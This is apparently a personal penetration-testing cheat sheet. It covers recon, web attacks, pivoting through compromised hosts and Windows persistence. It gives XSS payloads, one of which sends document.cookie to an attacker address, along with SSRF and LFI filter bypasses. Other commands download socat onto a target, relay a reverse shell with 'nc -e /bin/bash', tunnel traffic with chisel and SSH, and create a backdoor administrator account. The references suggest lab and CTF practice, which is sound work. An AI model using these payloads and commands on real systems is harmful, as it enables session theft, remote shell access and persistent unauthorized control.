# Pentest cheatsheet

## Recon

First fast recon
`nmap -oN -T5 first_fast_scan <IP>`

More precise scan on top 1000 ports
`nmap -A -T5 -oN top1000_agressive_scan <IP>`

Exhaustive scan (agressive and all ports)
`nmap -v -sS -A -Pn -T5 -p- -oN all_ports_agressive_scan <IP>`

Upd scan
`nmap -v -sU -T5 -oN udp_scna <IP>`

What to note
*    Services running
*    Services version
*    OS version
Search these with [searchsploit](https://www.exploit-db.com/searchsploit) or directly on [exploit database](https://www.exploit-db.com/).
If a RCE or intresting vuln is found check on [metasploit](https://www.metasploit.com/) if a module is available. Also search on github for potential PoCs.

If ports 21 is open try to connect to FTP (use [ncftp](https://linux.die.net/man/1/ncftp)) as `Anonymous` user.

If ports 139 and 445 are open, try to enumerate SMB.
`smbclient -L <IP>`

Try to connect to the availables Shares
`smbclient -U=Anonymous -N //<IP>/share`

You can also try a nmap script
`nmap -p445 -sV --script smb-enum-services <IP>`


## Web

**Examine traffic through burp**

Edit DNS local config
Linux `/etc/hosts`
Windows `C:\Windows\System32\drivers\etc\hosts`

Try tu put null bytes in the url to get 404 and see server error to get server type/version.


### Dirbusting
```shell=
gobuster -w SecLists/Discovery/Web_Content/big.txt -u http://<IP>/
gobuster -w SecLists/Discovery/Web_Content/raft-large-files.txt -u http://<IP>/
```
add -x for extensions

### Subdomains enumeration

If 443 is open or an SSL port is open navigate through the cert and look for subdomains.
Or use this command
```shell=
echo | openssl s_client -connect <IP>:443  | openssl x509 -noout -text | grep DNS | sed 's/,/\n/g'
```

Then put the subdomains in a hosts file and request them with `curl`:
```shell=
curl -vv 'Host: <domain>' <IP>
```

This msf module `auxiliary/scanner/http/vhost_scanner` can be useful for bruteforcing these.

### Local File Inclusion - LFI

If you see that a page is included from a parameter you control (GET parameter, POST parameter, cookie ...) you can try to change this parameter to get internal files of the server like pages you shouldn't access. You can first try to test the `/etc/passwd` to see if the website is vulnerable.

Possible bypasses:
*   Add null byte `%00` at the end to bypass extension completion
*   Use `....//` if `../` is removed but it's not recursive
*   Check all injectable parameters (cookies, get and post parameters)
*   use url encode or double url encore to bypass filters
*   use php-filters to get page content

### Server Side Request Forgery - SSRF

Look for an url in get or post parameter

*   Try to change the url to force the server to either request an api endpoint you should not be able to or your own server to reveal secrets like api keys
*   use `api.website.com/api/flag&x=` to remove the end of the url for the server request
*   use `x/../flag` to bypass filters
*   to bypass deny list use localhost references such as 0, 0.0.0.0, 0000, 127.1, 127.*.*.*, 2130706433, 017700000001 or subdomains that have a DNS record which resolves to the IP Address 127.0.0.1 such as 127.0.0.1.nip.io
*   to bypass an allow list for example allowing only url starting by `website.com` you can register a subdomain of your website like `website.com.www.blank.com`
*   if the filters bypass don't work you can still try to find an endpoint which allows open redirect and exploit it to expose internal resources

### Cross side Scripting - XSS

Standard payload:
`<script>alert('XSS');</script>`

Control of input tag:
`"><script>alert('XSS');</script>`

Control of text area:
`</textarea><script>alert('content')</script>`

Control of script tag:
`';alert('XSS');//`

`script` removal filter bypass:
`<sscriptcript>alert('XSS');</sscriptcript>`

Control of image path:
`/images/cat.jpg" onload="alert('XSS');`

Polyglot payload
```html=
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e`
```
Exfiltrate data:
`<script>fetch('http://<IP:PORT>?cookie=' + btoa(document.cookie) );</script>`

### Command injection

[Cheatsheet](https://github.com/payloadbox/command-injection-payload-list)

Detection of blind command injection :
*   `ping`
*   `sleep` on linux, `timeout` on windows
*   `>`

Bypass filters:
*   Use hexadecimal

## Reverse shells

[Craft reverse shells](revshells.com)

[Usefull resource for referse shells](https://delta.navisec.io/reverse-shell-reference/)

## Privesc

[Navisec's privesc documentation](https://delta.navisec.io/privilege-escalation/)

Payload all the things

[Linux](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
[Windows](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

### Linux

Exploit available binaries : https://gtfobins.github.io/


### Windows

Exploit windows native binaries : https://lolbas-project.github.io/#



## Pivoting

Resources :
*    https://tryhackme.com/room/wreath

### Linux

#### Network discovering

Local files to check
```shell=
/etc/hosts
/etc/resolv.conf
```

Commands to try
```shell=
nmcli dev show
arp -a
```

Bash one-liner full ping sweep of the network
`for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done`

Bash one-liner port scan
`for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done`

Use compiled tools : https://github.com/andrew-d/static-binaries

Compiled nmap : https://github.com/ernw/static-toolbox/releases/download/1.04/nmap-7.80SVN-x86_64-a36a34aa6-portable.zip

Scan though a proxy

### Windows

#### Network discovering

Local files to check
```shell=
C:\Windows\System32\drivers\etc\hosts
```

Commands to try
```shell=
ipconfig /all
arp -a
```
Import and compile tools :

https://github.com/MuirlandOracle/C-Sharp-Port-Scan

https://github.com/MuirlandOracle/CPP-Port-Scanner


### Proxies

**TL;DR**

*   Proxychains and FoxyProxy are used to access a proxy created with one of the other tools
*   SSH can be used to create both port forwards, and proxies
plink.exe is an SSH client for Windows, allowing you to create reverse SSH connections on Windows
*   Socat is a good option for redirecting connections, and can be used to create port forwards in a variety of different ways
*   Chisel can do the exact same thing as with SSH portforwarding/tunneling, but doesn't require SSH access on the box
*   sshuttle is a nicer way to create a proxy when we have SSH access on a target

#### Proxychains

Create (or edit) config file `/etc/proxychains.conf` or create a local `./proxychains.conf` or `~/.proxychains/proxychains.conf` file.

Only tcp scans, specify `-Pn` to forbid icmp scans.

#### Foxyproxy

Use [foxyproxy](https://addons.mozilla.org/en-GB/firefox/addon/foxyproxy-basic/) for web apps.

#### SSH Port Fordwarding 

If you have an ssh access on a first server you can use it for ssh tunneling to access the service the distant network as if it was running locally.

```shell=
ssh -L <local-port>:<remote-ip>:<distant-port> <user>@<local-ip> -fN
```

#### SSH Proxy

You can also setup a ssh proxy with the `-D` option

```shell=
ssh -D <local-port> <user>@<distant-ip> -fN
```

#### Reverse ssh connection

If you have a shell on the distant machine but no ssh access, you can connect from the distant machine to your local one using a reverse connection. To do so, follow these steps :
* `ssh-gen` on the distant machine to generate a pair of rsa keys
* copy the content of the `.pub` in your local `~/ssh/authorized_keys` file
* check if the ssh service is running on your local machine with `sudo systemctl status ssh`. If it is not running, start it with `sudo systemctl start ssh`
* On your local machine type the following command `command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty` and then paste the public key
* Now it's time to connect back with the following command from the distant machine `ssh -R <local-port>:<distant-machine-ip>:<distant-machine-port> <local-user>@<local-ip> -i <keyfile> -fN` or `ssh -R <local-port> <local-user>@<local-ip> -i <keyfile> -fN` for newer ssh versions

#### plink.exe

[plink.exe](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html) is a Windows command line version of the PuTTY SSH client. Useful mostly on old windows servers as recent versions of windows have ssh built-in.

`ssh-keygen` won't work properly here, you will need to use `puttygen` to convert them into a `.ppk` file.

```shell=
puttygen <keyfile> -o keyfile.ppk
```

Then transfer the `.ppk` file to the distant windows machine and add the key to the `authorized_keys` file on your local machine.

Run this command on the distant windows server
```shell=
cmd.exe /c echo y | .\plink.exe -R <local-port>:<remote-ip>:<remote-port> <local-user>@<local-ip> -i <keyfile> -N
```

#### Socat

[Linux static binaries](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat)

[Windows static binaries](https://sourceforge.net/projects/unix-utils/files/socat/1.7.3.2/socat-1.7.3.2-1-x86_64.zip/download)

Check [here](https://tryhackme.com/room/introtoshells) for encrypted shells and custom compilation.

On your local machine run `sudo python3 -m http.server 80`

Then on target `curl <local-ip>/socat -o /tmp/socat-<local-username> && chmod +x /tmp/socat-<local-username>`

And now you have a socat binary on the target.

##### Reverse shell relay

Now let's connect back to our own machine from the target.

To do that, first start a listener on your local machine `sudo nc -lvnp <local-port>`.
> Good port to use to bypass firewall are 80 or 443

Next connect with `socat` from the target : `./socat tcp-l:<relay-port> tcp:<local-ip>:<local-port> &`

Now it's time to create a reverse shell to the newly open port `relay-port` on the target. Run the following command on the target server : `nc 127.0.0.1 <relay-port> -e /bin/bash`

The problem with this method is that it opens a port on the relay server, for a more quiet method see the next section.

##### Port forwarding - Classic

Then create the port forward run the next command on your local machine : `./socat tcp-l:<relay-port>,fork,reuseaddr tcp:<target-ip>:<target-port> &`

Now the `distant-port` should now be forwarded to the relay server meanning that you can access the distant service from `relay-ip:relay-port`

##### Port forwarding - Quiet

First run this on your local machine `socat tcp-l:<local-port1> tcp-l:<local-port2>,fork,reuseaddr &`

Then run this on the relay server `./socat tcp:<local-ip>:<local-port1> tcp:<target-ip>:<target-port>,fork &`

Now the `target-port` should now be forwarded to localhost meanning that you can access the distant service from `localhost:local-port2`.

To stop the port forwarding you have to run the `jobs` command and the kill all socat processes using `kill %<job-bumber>`

> TODO : Add crypted reverse shells see [shells room](https://tryhackme.com/room/introtoshells) step 7

### Chisel

[Chisel](https://github.com/jpillora/chisel) is a tool that can be used to setup a tunneled proxy or port forward through a compromised system. Written in go, it can be compiled for any system.

If you have an ssh access you can use the following command to copy the chisel binary to the compromised server : `scp -i <keyfile> chisel user@target:/tmp/chisel-<username>`

#### Reverse SOCKS Proxy

First on your local machine run the following command : `./chisel server -p <local-port> --reverse &`

Then run this command on the proxy machine : `./chisel client <local-ip>:<local-port> R:socks &`

> Note that the port to send the data through will be different that the listener port.

#### Forward SOCKS Proxy

First run `./chisel server -p <listen-port> --socks5` on the proxy machine.

And then `./chisel client <proxy-ip>:<listen-port> <local-port>:socks` in your local machine. Here listen port is the open port on the proxy machine and local-port is the port we will use to send traffic through on our local machine.

As Cheisel use a SOCK5 proxy you need to update the proxychains configuration.
```shell=
[ProxyList]
# add proxy here ...
# meanwhile
# defaults set to "tor"
socks5  127.0.0.1 <local-port>
```

#### Remote port forward

Remote forward is when you connect back from a compromised target to the remote port forward.

First on your local machine run the following command : `./chisel server -p <listen-port> --reverse &`

Then run this command on the compromised server : `./chisel client <local-ip>:<listen-port> R:<local-port>:<target-ip>:<target-port> &`

Here `listen-port` is the port that you started chisel on and `local-port` is the port you wish to open on your local machine to link with the remote port.

Now you should be able the service from `distant-ip:distant-port` on `localhost:local-port`.

#### Local port forward

As with SSH, a local port forward is where we connect from our own attacking machine to a chisel server listening on a compromised target.

First run `./chisel server -p <listen-port>` on the compromised server.

Then run `./chisel client <compromised-ip>:<listen-port> <local-port>:<target-ip>:<target-port>` on your local machine.

Now the `target-ip:target-port` should be accessible from `compromised-ip:listen-port`.

As you backgrounded socat processes, when you want your chisel connections you can use `jobs` to see the background jobs, then `kill %NUMBER` to kill all chisel processes.

> **Note:** When using chisel on windows upload it with `.exe` extension.

### sshuttle

[sshuttle](https://github.com/sshuttle/sshuttle) uses an SSH connection to create a tunneled proxy that acts like a new interface. In short it simulates a VPN, allowing you to route traffic through the proxy without the use of proxychains (or equivalent). A nice bonus is that all the tunneled traffic is encrypted as it uses ssh.

> **Note:** This tool only works on Linux targets

The command to connect to a server is `sshuttle -r <username>@<server-ip> <subnet--ip-range>`

> **Note:** Don't forget the mask at the end of the subnet
> **Note:** The `-N` option can be used to attemp an automatically detect the subnet using the server routing table

If the server only allows keyfile authentication you will need to use the `--ssh-cmd` command as this is not natively supported by sshuttle.

The command will look like this `sshuttle -r <username>@<server-ip> --ssh-cmd "ssh -i <keyfile>" <subnet-ip-range>`

> **Note:** If you encounter an error that looks like this:
> ```shell=
> client: Connected.
> client_loop: send disconnect: Broken pipe
> client: fatal: server died with error code 255
> ```
> This can occur when the compromised machine you're connecting to is part of the subnet you're attempting to gain access to.
> To get around this, tell sshuttle to exlude the compromised server from the subnet using the `-x <server-ip>` option.

## Persistence

### Windows

If you can run commands on the machine as `nt authorithy\system` then create an administrator account and add it to the `Remote Management Users` group.

```powershell=
PS C:\> net user blank blank /add

PS C:\> net localgroup Administrators blank /add

PS C:\> net localgroup "Remote Management Users" blank /add
```

Then you can use `net user <username>` to check the local groups of your user.

Once the user is created you can connect to the machine by using either RDP or WinRM.

If you chose WinRM, you can use [evil-winrm](https://github.com/Hackplayers/evil-winrm).

If you chose RDP, you can use [freerdp2-x11](https://packages.debian.org/fr/sid/freerdp2-x11).